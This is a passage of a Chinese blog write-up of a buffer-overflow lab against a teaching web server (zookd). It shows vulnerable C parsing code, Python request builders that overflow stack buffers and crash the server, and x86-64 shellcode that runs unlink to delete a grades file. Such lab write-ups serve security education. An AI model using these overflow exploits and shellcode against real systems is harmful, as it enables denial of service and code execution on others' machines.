<span class="hljs-keyword">return</span> sockfd;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run_server</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *port)</span> &#123;<br>    <span class="hljs-type">int</span> sockfd = start_server(port);<br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br><span class="hljs-type">int</span> cltfd = accept(sockfd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">int</span> pid;<br><span class="hljs-type">int</span> status;<br><br><span class="hljs-keyword">if</span> (cltfd &lt; <span class="hljs-number">0</span>)<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;accept&quot;</span>);<br><br><span class="hljs-comment">/* fork a new process for each client process, because the process</span><br><span class="hljs-comment"> * builds up state specific for a client (e.g. cookie and other</span><br><span class="hljs-comment"> * enviroment variables that are set by request). We want to get rid off</span><br><span class="hljs-comment"> * that state when we have processed the request and start the next</span><br><span class="hljs-comment"> * request in a pristine state.</span><br><span class="hljs-comment">         */</span><br><span class="hljs-keyword">switch</span> ((pid = fork()))<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;fork&quot;</span>);<br><br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>    process_client(cltfd);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">default</span>:<br>    close(cltfd);<br>    pid = wait(&amp;status);<br>    <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Child process %d terminated incorrectly, receiving signal %d\n&quot;</span>,<br>       pid, WTERMSIG(status));<br>    &#125;<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">accidentally</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>       __asm__(<span class="hljs-string">&quot;mov 16(%%rbp), %%rdi&quot;</span>: : :<span class="hljs-string">&quot;rdi&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看一下源代码，我们可以知道process_client是入口函数，这里定义了两个数组，env和reqpath，注释信息提示我们env是静态变量不在栈上存储，因此我们后面分析可以针对reqpath这个数组，观察其是否可以构造出溢出。继续跟进，我们看到这个数组被传入http_request_line()，我们进入这个函数</p><p>http.c (部分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">int</span> <span class="hljs-title function_">http_read_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-type">int</span> cc = read(fd, &amp;buf[i], <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (cc &lt;= <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;\r&#x27;</span>)<br>        &#123;<br>            buf[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;      <span class="hljs-comment">/* skip */</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        &#123;<br>            buf[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i &gt;= size - <span class="hljs-number">1</span>)<br>        &#123;<br>            buf[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        i++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>    <span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>    sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!sp1)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>    *sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    sp1++;<br>    <span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>    sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!sp2)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>    *sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    sp2++;<br><br>    <span class="hljs-comment">/* We only support GET and POST requests */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br>    <span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>    &#123;<br>        *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br>        <span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!sp)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>        *sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        sp++;<br><br>        <span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br>        <span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> (*colon != <span class="hljs-string">&#x27;:&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>        *colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>        <span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>            buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>            <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>                buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>        url_decode(value, sp);<br><br>        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>......<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">url_decode</span><span class="hljs-params">(<span class="hljs-type">char</span> *dst, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *src)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (src[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span> &amp;&amp; src[<span class="hljs-number">1</span>] &amp;&amp; src[<span class="hljs-number">2</span>])<br>        &#123;<br>            <span class="hljs-type">char</span> hexbuf[<span class="hljs-number">3</span>];<br>            hexbuf[<span class="hljs-number">0</span>] = src[<span class="hljs-number">1</span>];<br>            hexbuf[<span class="hljs-number">1</span>] = src[<span class="hljs-number">2</span>];<br>            hexbuf[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>            *dst = strtol(&amp;hexbuf[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>            src += <span class="hljs-number">3</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (src[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;+&#x27;</span>)<br>        &#123;<br>            *dst = <span class="hljs-string">&#x27; &#x27;</span>;<br>            src++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            *dst = *src;<br>            src++;<br><br>            <span class="hljs-keyword">if</span> (*dst == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        dst++;<br>    &#125;<br>&#125;<br>......<br><span class="hljs-type">void</span> <span class="hljs-title function_">fdprintf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *fmt, ...)</span><br>&#123;<br>    <span class="hljs-type">char</span> *s = <span class="hljs-number">0</span>;<br><br>    va_list ap;<br>    va_start(ap, fmt);<br>    vasprintf(&amp;s, fmt, ap);<br>    va_end(ap);<br><br>    write(fd, s, <span class="hljs-built_in">strlen</span>(s));<br>    <span class="hljs-built_in">free</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到参数被转递到了url_decode(reqpath, sp1)，看注释我们就可以了解，这是想对输入的请求的path进行url解码，我们继续进入url_decode函数，可以看到这个函数进行了url解码，但是问题是并没有判断复制的长度，它会将sp1中所有的内容解码后放入reqpath，直到遇到’\0’结尾为止。那么问题来了，回到http_request_line(int fd, char *reqpath, char *env, size_t *env_len)函数，buf的最大长度为8192，而之前定义的reqpath的最长长度为4096，因此，我们可以构造一个大于4096，小于8192的请求头（准确来说是头部第一行长度小于8192，但是请求的地址大于4096）。</p><p>随后继续查看其余的可能有溢出的位置，我们通过process_client可以继续往下看，有一个http_request_headers函数，进入这个函数内部，发现它定义了三个数组，buf是静态数组，长度8192，我们不考虑，因此我们看存储在栈上的两个数组value和envvar。我们阅读这个函数可以看出来，这个函数作用是解析HTTP请求的头部信息。往后看又看到了熟悉的不安全函数url_decode()，并且该函数使用了value作为参数，那么这里和上面一样，我们只需要构造一个头部的键值对，使得该键对应的值大于value的长度512，同时保证该键值对的总长度小于8192即可。</p><h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习 2"></a>练习 2</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">编写一个利用缓冲区溢出使 Web 服务器（或其创建的进程之一）崩溃的攻击。此时不需要注入代码。通过使用 gdb检查下面的最后几行来验证您的漏洞是否使服务器崩溃  `dmesg | tail`， 或观察 Web 服务器崩溃。<br></code></pre></td></tr></table></figure><p><strong>1.利用reqpath溢出</strong></p><p>根据给出的一个exploit-template.py模板去编写EXP，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment">## Things that you might find useful in constructing your exploit:</span><br>    <span class="hljs-comment">##</span><br>    <span class="hljs-comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span><br>    <span class="hljs-comment">##     returns string s with &quot;special&quot; characters percent-encoded</span><br>    <span class="hljs-comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span><br>    <span class="hljs-comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span><br><br>    req =   <span class="hljs-string">b&quot;GET /&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8000</span>):<br>         req += <span class="hljs-string">b&quot;A&quot;</span><br>    req += <span class="hljs-string">b&quot; HTTP/1.0\r\n\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br><br></code></pre></td></tr></table></figure><p>我们构造了一个长度为8000的请求地址，然后开启服务后执行这个EXP，我们就可以看到zookd服务报了一个错误，Child process 1849 terminated incorrectly, receiving signal 11，说明子进程异常终止，我们触发了栈溢出。也可以直接使用make check-crash进行测试。</p><p><strong>2.利用value溢出</strong></p><p>同理，根据前面分析的漏洞原理，我们只需要构造一个头部的键值对，保证值value大于512小于8192。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment">## Things that you might find useful in constructing your exploit:</span><br>    <span class="hljs-comment">##</span><br>    <span class="hljs-comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span><br>    <span class="hljs-comment">##     returns string s with &quot;special&quot; characters percent-encoded</span><br>    <span class="hljs-comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span><br>    <span class="hljs-comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span><br><br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;EXP: &quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8000</span>):<br>         req += <span class="hljs-string">b&quot;A&quot;</span><br>    req += <span class="hljs-string">b&quot;r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br><br></code></pre></td></tr></table></figure><p>注意键值之间需要有英文冒号和空格。验证过程同上，也会导致子进程异常。</p><h2 id="二、代码注入"><a href="#二、代码注入" class="headerlink" title="二、代码注入"></a>二、代码注入</h2><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">修改shellcode.S，解链接<span class="hljs-regexp">/home/</span>student/grades.txt。 程序集代码可以调用SYS_unlink系统调用，也可以调用unlink()库函数。 <br></code></pre></td></tr></table></figure><p>我们使用系统调用unlink，具体调用方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">argv = &#123;<span class="hljs-string">&quot;/usr/bin/unlink&quot;</span>, <span class="hljs-string">&quot;/home/student/grades.txt&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>envp = &#123;<span class="hljs-number">0</span>&#125;;<br>execve(<span class="hljs-string">&quot;/usr/bin/unlink&quot;</span>, argv, envp);<br></code></pre></td></tr></table></figure><p>我们要将C代码写成汇编的形式，为了避免高级语言编译时由于编译器的原因导致地址的变化等情况：</p><p>x86汇编有两种书写形式，分别为Intel和AT&amp;T。区别在于AT&amp;T寄存器前有%标识，且源地址在前，目的地址在后（mov src dst），Intel与之相反，目的地址在前，源地址在后（mov dst src），并且没有%标识。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#include &lt;sys/syscall.h&gt;<br><br>#define STRING&quot;/usr/bin/unlink_/home/student/grades.txt_&quot;<br>#define STRLEN41<br>#define ARGV(STRLEN+1)<br>#define ARGVONE(ARGV+8)<br>#define ARGVTWO(ARGV+16)<br>#define ENVP(ARGV+24)<br><br>.globl main<br>.typemain, @function<br><br> main:<br>jmpcalladdr<br><br> popladdr:<br>popq%rcx<br>movq%rcx,(ARGV)(%rcx)/* set up argv pointer to pathname */<br>leaq    (16)(%rcx), %rax   /* get argv1 addr */<br>movq    %rax, (ARGVONE)(%rcx) /* write argv1 addr */<br>xorq%rax, %rax/* get a 64-bit zero value */<br>movq    %rax, (ARGVTWO)(%rcx) /* argv2 is null */<br>movq%rax,(ENVP)(%rcx)/* set up null envp */<br>movb%al,(15)(%rcx)/* _ to 0 */<br>movb%al,(STRLEN - 1)(%rcx)/* null-terminate our string */<br><br>movb$SYS_execve,%al/* set up the syscall number */<br>movq%rcx,%rdi/* syscall arg 1: string pathname */<br>leaqARGV(%rcx),%rsi/* syscall arg 2: argv */<br>leaqENVP(%rcx),%rdx/* syscall arg 3: envp */<br>syscall/* invoke syscall */<br><br>xorq%rax,%rax/* get a 64-bit zero value */<br>movb    $SYS_exit,%al/* set up the syscall number */<br>xorq%rdi,%rdi/* syscall arg 1: 0 */<br>syscall/* invoke syscall */<br><br> calladdr:<br>callpopladdr<br>.asciiSTRING<br></code></pre></td></tr></table></figure><p>AT&amp;T方式寻址模式：</p><p><img src="/images/x86xunzhi.png"></p><p>上面的汇编代码使用make编译之后就可以使用<code>./run-shellcode shellcode.bin</code>，然后检查~&#x2F;grades.txt是否被删除，如果被删除就可以进行下面的工作了。</p><h3 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">构造一个劫持web服务器的控制流并解除<span class="hljs-regexp">/home/</span>student/grades.txt链接的漏洞。 将此漏洞利用保存在一个名为exploit-<span class="hljs-number">4</span>.py的文件中。 <br>建议:首先关注获取程序计数器的控制权。 勾画出在缓冲区溢出时希望程序拥有的堆栈布局，并使用gdb来验证溢出数据是否到达了预期的位置。 逐步执行函数到返回指令，以确保您可以控制程序返回的地址。 接下来，gdb中的stepi和x命令应该是有用的。 <br>一旦你可以可靠地劫持程序的控制流，找到一个合适的地址，其中将包含你想要执行的代码，并专注于将正确的代码放在该地址——例如。 所提供的shell代码的派生。 